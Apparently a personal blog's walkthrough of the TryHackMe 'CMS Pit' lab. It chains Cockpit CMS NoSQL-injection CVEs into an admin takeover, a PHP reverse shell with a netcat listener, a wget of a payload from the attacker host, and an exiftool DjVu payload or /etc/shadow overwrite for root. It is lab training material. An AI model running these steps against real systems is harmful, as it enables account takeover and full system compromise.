<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="layout-lang" content="en"><meta name="day-prompt" content="d ago"><meta name="hour-prompt" content="hr ago"><meta name="minute-prompt" content="min ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="THM - CMS Pit walkthrough" /><meta name="author" content="w33vils" /><meta property="og:locale" content="en" /><meta name="description" content="CMS PIT Walkthrough - w/o Metasploit" /><meta property="og:description" content="CMS PIT Walkthrough - w/o Metasploit" /><link rel="canonical" href="https://w33vils.github.io/posts/thm_cmspit_walkthrough/" /><meta property="og:url" content="https://w33vils.github.io/posts/thm_cmspit_walkthrough/" /><meta property="og:site_name" content="w33vil’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-08-06T08:00:00+03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="THM - CMS Pit walkthrough" /><meta name="twitter:site" content="@w33vils" /><meta name="twitter:creator" content="@w33vils" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"w33vils"},"dateModified":"2021-08-06T08:00:00+03:00","datePublished":"2021-08-06T08:00:00+03:00","description":"CMS PIT Walkthrough - w/o Metasploit","headline":"THM - CMS Pit walkthrough","mainEntityOfPage":{"@type":"WebPage","@id":"https://w33vils.github.io/posts/thm_cmspit_walkthrough/"},"url":"https://w33vils.github.io/posts/thm_cmspit_walkthrough/"}</script><title>THM - CMS Pit walkthrough | w33vil's blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="w33vil's blog"><meta name="application-name" content="w33vil's blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang=""><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/prof.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">w33vil's blog</a></div><div class="site-subtitle font-italic">Pentester</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/w33vils" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/w33vils" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['uv.w','outlook.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>THM - CMS Pit walkthrough</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>THM - CMS Pit walkthrough</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> w33vils </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Aug 6, 2021, 8:00 AM +0300" >Aug 6, 2021<i class="unloaded">2021-08-06T08:00:00+03:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1008 words">5 min read</span></div></div><div class="post-content"><h1 id="cms-pit-walkthrough---wo-metasploit">CMS PIT Walkthrough - w/o Metasploit</h1><p>I was interested in documenting this box, since I used it to write my own exploit, hence the writeup. You can access the box at</p><blockquote><p>https://tryhackme.com/room/cmspit</p></blockquote><h2 id="scanning">Scanning</h2><p>We start off by running an extensive <code class="language-plaintext highlighter-rouge">nmap</code> scan. I prefer using <a href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a> for this.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="c"># cat nmapAutomator_10.10.48.163_Full.txt                                             </span>

Running a Full scan on 10.10.48.163

Host is likely running Linux

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Making a script scan on all ports
                                                         
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 7f:25:f9:40:23:25:cd:29:8b:28:a9:d9:82:f5:49:e4 <span class="o">(</span>RSA<span class="o">)</span>
|   256 0a:f4:29:ed:55:43:19:e7:73:a7:09:79:30:a8:49:1b <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 2f:43:ad:a3:d1:5b:64:86:33:07:5d:94:f9:dc:a4:01 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
| http-title: Authenticate Please!
|_Requested resource was /auth/login?to<span class="o">=</span>/
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

</pre></table></code></div></div><p>Only port 22 and 80 are running, so naturally, we proceed to enumerate port 80.</p><h2 id="enumeration">Enumeration</h2><p>Heading over to port 80, we find the landing page below. After basic checking of the icon, we establish this is cockpit CMS.</p><p><img data-proofer-ignore data-src="/assets/img/images/cockpit/cms.png" alt="" /> <em>cockpit cms</em></p><p>We can check the CMS’s <a href="https://github.com/agentejo/cockpit">Github Page</a>, to enumerate files and determine the version. For instance, using the <code class="language-plaintext highlighter-rouge">package.json</code> file, we can determine the running version.</p><p><img data-proofer-ignore data-src="/assets/img/images/cockpit/version.png" alt="" /></p><p>A quick google search for the CMS version, tells us the version is vulnerable to a three NoSQL vulnerabilities documented under CVE-2020-35846, CVE-2020-35847 and CVE-2020-35848. Read more about it <a href="https://swarm.ptsecurity.com/rce-cockpit-cms/">here</a>.</p><h2 id="exploitation">Exploitation</h2><p>Basically, the CMS does not carry out proper checks on the following methods, which allows for username extraction, and password reset, leading to full account takeover.</p><blockquote><p>/auth/check – CVE-2020-35846</p></blockquote><blockquote><p>/auth/resetpassword – CVE-2020-35847</p></blockquote><blockquote><p>/auth/newpassword – CVE-2020-35848</p></blockquote><p>Again, Swam Security have done a good job documenting it <a href="https://swarm.ptsecurity.com/rce-cockpit-cms/">here</a>.</p><p>At the time of writing this, I was able to get RCE on the platform using Metasploit. I however wanted to challenge myself to pwn it by writing my own python implementation exploit, and as a way to practice what I learnt from OSCP.:</p><p>I wrote this <a href="https://github.com/w33vils/CVE-2020-35847_CVE-2020-35848"><code class="language-plaintext highlighter-rouge">exploit</code></a> that allows for username enumeration, password reset token request and password reset, which leads to a full account takeover.</p><blockquote><p>https://github.com/w33vils/CVE-2020-35847_CVE-2020-35848</p></blockquote><p>We can use the exploit to get details for user <code class="language-plaintext highlighter-rouge">skidy</code> as below:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root💀kali<span class="o">)</span>-[~/…/c/thm/cmspit/CVE-2020-35847_CVE-2020-35848]
└─# python3 exploit.py <span class="nt">-u</span> http://10.10.120.242
<span class="o">[</span>+] http://10.10.120.242: is reachable
<span class="o">[</span>-] Attempting Username Enumeration : 

<span class="o">[</span>+] Users Found : <span class="o">[</span><span class="s1">'admin'</span>, <span class="s1">'darkStar7471'</span>, <span class="s1">'skidy'</span>, <span class="s1">'ekoparty'</span><span class="o">]</span>

<span class="o">[</span>-] Get user details For : skidy
<span class="o">[</span>+] Finding Password reset tokens
         Tokens Found : <span class="o">[</span><span class="s1">'rp-285c93eea18105373be28d8e2d5f22c861102d2b04b29'</span><span class="o">]</span>
<span class="o">[</span>+] Obtaining user information 
<span class="nt">-----------------Details--------------------</span>
         <span class="o">[</span><span class="k">*</span><span class="o">]</span> user : skidy
         <span class="o">[</span><span class="k">*</span><span class="o">]</span> email : &lt;redacted
         <span class="o">[</span><span class="k">*</span><span class="o">]</span> active : True
         <span class="o">[</span><span class="k">*</span><span class="o">]</span> group : admin
         <span class="o">[</span><span class="k">*</span><span class="o">]</span> i18n : en
         <span class="o">[</span><span class="k">*</span><span class="o">]</span> api_key : account-21ca3cfc400e3e565cfcb0e3f6b96d
         <span class="o">[</span><span class="k">*</span><span class="o">]</span> password : <span class="nv">$2y$10$uiZPeUQNErlnYxbI5PsnLurWgvhOCW2LbPovpL05XTWY</span>.jCUave6S
         <span class="o">[</span><span class="k">*</span><span class="o">]</span> name : Skidy
         <span class="o">[</span><span class="k">*</span><span class="o">]</span> _modified : 1621719311
         <span class="o">[</span><span class="k">*</span><span class="o">]</span> _created : 1621719311
         <span class="o">[</span><span class="k">*</span><span class="o">]</span> _id : 60a9790f393037a2e400006a
         <span class="o">[</span><span class="k">*</span><span class="o">]</span> _reset_token : rp-285c93eea18105373be28d8e2d5f22c861102d2b04b29
         <span class="o">[</span><span class="k">*</span><span class="o">]</span> md5email : 5dfac21f8549f298b8ee60e4b90c0e66
<span class="nt">--------------------------------------------</span>
</pre></table></code></div></div><p>Futhermore, we can reset skidy’s password. But lets reset the admin’s password instead. For this, we need to generate the admin’s password reset token (if not already available) rerunning the code and selecting admin user will automatically generate the admin’s tokens.</p><p>You can then reset the password as below:</p><p><img data-proofer-ignore data-src="/assets/img/images/cockpit/admin.png" alt="" /> <em>Taking over the admin’s account</em></p><p>After this, we can log into the platform with the new credentials.</p><p>After successfully logging in as admin, we can use the <code class="language-plaintext highlighter-rouge">finder</code> utility in Cockpit, to upload a PHP reverse shell. We can use <a href="https://github.com/pentestmonkey/php-reverse-shell">pentest monkey’s</a> php reverse shell. Make sure to edit the IP and port that you will be listening on.</p><p><img data-proofer-ignore data-src="/assets/img/images/cockpit/finder.png" alt="" /> <em>finder utility for uploading reverse shell</em></p><p>Next, start a netcat listener on the port you configured, 443 in my case.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>└─# nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ..
</pre></table></code></div></div><p>Then, we can navigate to the reverse shell, to trigger it to get a reverse shell.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://10.10.120.242/shell.php
</pre></table></code></div></div><p>We get a shell running as:</p><p><img data-proofer-ignore data-src="/assets/img/images/cockpit/shell.png" alt="" /> <em>www-data shell</em></p><p>The first flag can be found under <em>/var/www/html/cockpit/webflag.php’</em></p><p><img data-proofer-ignore data-src="/assets/img/images/cockpit/flag1.png" alt="" /> <em>First flag</em></p><h2 id="privilege-escalation">Privilege Escalation</h2><p>Accessing user <code class="language-plaintext highlighter-rouge">stux</code>’s homepage, we get an interesting <code class="language-plaintext highlighter-rouge">dbshell</code> file. Checking it’s contents, we get the second flag, as well as what looks like a password.</p><p><img data-proofer-ignore data-src="/assets/img/images/cockpit/flag2.png" alt="" /> <em>Second flag &amp; Password</em></p><p>We try to SSH to the box as user stux, and the password, and we are successful. Subsequently, we are able to read the <code class="language-plaintext highlighter-rouge">user.txt</code> flag.</p><p><img data-proofer-ignore data-src="/assets/img/images/cockpit/user.png" alt="" /> <em>user.txt</em></p><p>Further enumeration of <code class="language-plaintext highlighter-rouge">sudo rights</code>, we notice user stux can run <em>exiftool</em> as sudo without a password.</p><p><img data-proofer-ignore data-src="/assets/img/images/cockpit/exiftool.png" alt="" /></p><p>From searching exiftool CVE’s on Google, we bump into this <a href="https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/">article</a></p><p>The blog has answers to the remaining questions:</p><p>According to the blog, we can create a file, <em>payload</em>, with the contents :</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>└─# <span class="nb">cat </span>payload 
<span class="o">(</span>metadata <span class="s2">"</span><span class="se">\c</span><span class="k">${</span><span class="nv">system</span><span class="p">(</span><span class="s1">'/bin/bash'</span><span class="p">)</span><span class="k">}</span><span class="s2">;"</span><span class="o">)</span>
</pre></table></code></div></div><p>Then follow the steps below:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>- <span class="nb">sudo </span>apt <span class="nb">install </span>djvulibre-bin
- bzz payload payload.bzz
- djvumake exploit.djvu <span class="nv">INFO</span><span class="o">=</span><span class="s1">'1,1'</span> <span class="nv">BGjp</span><span class="o">=</span>/dev/null <span class="nv">ANTz</span><span class="o">=</span>payload.bzz

</pre></table></code></div></div><p>If you follow the above steps correctly, you should end up with two files as below:</p><p><img data-proofer-ignore data-src="/assets/img/images/cockpit/djvu.png" alt="" /> <em>generated files</em></p><p>We upload the <code class="language-plaintext highlighter-rouge">exploit.djvu</code> file to our victim machine. We can use a python simple server serving on port 80 for this.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>─# python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...

</pre></table></code></div></div><p>On our victim machine, we can use <code class="language-plaintext highlighter-rouge">wget</code> to download.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>wget http://10.9.167.154/exploit.djvu
</pre></table></code></div></div><p>Finally, we run the exploit using exiftool as sudo as below to get root.</p><p><img data-proofer-ignore data-src="/assets/img/images/cockpit/priv.png" alt="" /> <em>Running the exploit using exiftool gives us root.</em></p><h3 id="alternative-method">Alternative method.</h3><p>You can also use <a href="https://gtfobins.github.io/gtfobins/exiftool/">GTFOBINS</a> to gain root on this box.</p><p>You can follow the steps:</p><ul><li>First, create a backup of the <em>/etc/shadow</em> file using exiftool.<li>Then copy your kali’s /etc/shadow to your working directory, generate a sha512 password using <em>mkpasswd</em> and replace the new hash with the root’s hash.<li>Upload this file on the host, and copy it onto the <em>/etc/shadow</em> path.<li>Finally, sudo with the new password.</ul><h2 id="lessons-learnt">Lessons learnt</h2><ol><li>Constantly patching software to avoid using components with known vulnerabilities.<li>Not running exiftool as sudo, without a password.</ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/walkthroughs/'>Walkthroughs</a>, <a href='/categories/thm/'>THM</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >TryHackMe</a> <a href="/tags/cockpit/" class="post-tag no-text-decoration" >cockpit</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=THM - CMS Pit walkthrough - w33vil's blog&url=https://w33vils.github.io/posts/thm_cmspit_walkthrough/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=THM - CMS Pit walkthrough - w33vil's blog&u=https://w33vils.github.io/posts/thm_cmspit_walkthrough/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=THM - CMS Pit walkthrough - w33vil's blog&url=https://w33vils.github.io/posts/thm_cmspit_walkthrough/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/oscp_review/">My OSCP Experience</a><li><a href="/posts/blog_downtimeDetector/">Python DowntimeDetector</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/regex/">regex</a> <a class="post-tag" href="/tags/telegram/">telegram</a> <a class="post-tag" href="/tags/tryhackme/">TryHackMe</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/cockpit/">cockpit</a> <a class="post-tag" href="/tags/crtp/">CRTP</a> <a class="post-tag" href="/tags/downtime/">downtime</a> <a class="post-tag" href="/tags/email/">email</a> <a class="post-tag" href="/tags/mona/">mona</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/thm_gatekeeper_walkthrough/"><div class="card-body"> <span class="timeago small" >Sep 15, 2020<i class="unloaded">2020-09-15T08:00:00+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>THM - GateKeeper Walkthrough</h3><div class="text-muted small"><p> Introduction I wrote this walkthrough to help me understand Buffer overflows better, in readiness for my OSCP exam. The room itself is Joe Helle’s (The Mayor) Gatekeeper. You can access it here I...</p></div></div></a></div><div class="card"> <a href="/posts/dns/"><div class="card-body"> <span class="timeago small" >Jan 1<i class="unloaded">2025-01-01T00:00:00+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Dns</h3><div class="text-muted small"><p> 🌐 Why DNS is Cool… and Not So Cool 1 2 3 4 5 6 7 8 9 10 11 12 ╔══════════════════════════════════════╗ ║ 🌐 DNS 🌐 ║ ║ The Internet's Magic ║ ...</p></div></div></a></div><div class="card"> <a href="/posts/osep-review/"><div class="card-body"> <span class="timeago small" >Dec 18, 2022<i class="unloaded">2022-12-18T08:00:00+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OSEP Review</h3><div class="text-muted small"><p> I recently passed the Evasion Techniques and Breaching Defenses course or as it is known - Offensive Security Experienced Pentester (OSEP) exam by Offensive Security and here are my no-one-asked th...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/oscp_review/" class="btn btn-outline-primary" prompt="Older"><p>My OSCP Experience</p></a> <a href="/posts/crtp-review/" class="btn btn-outline-primary" prompt="Newer"><p>CRTP Review</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/w33vils">Brian Ombongi</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/regex/">regex</a> <a class="post-tag" href="/tags/telegram/">telegram</a> <a class="post-tag" href="/tags/tryhackme/">TryHackMe</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/cockpit/">cockpit</a> <a class="post-tag" href="/tags/crtp/">CRTP</a> <a class="post-tag" href="/tags/downtime/">downtime</a> <a class="post-tag" href="/tags/email/">email</a> <a class="post-tag" href="/tags/mona/">mona</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://w33vils.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
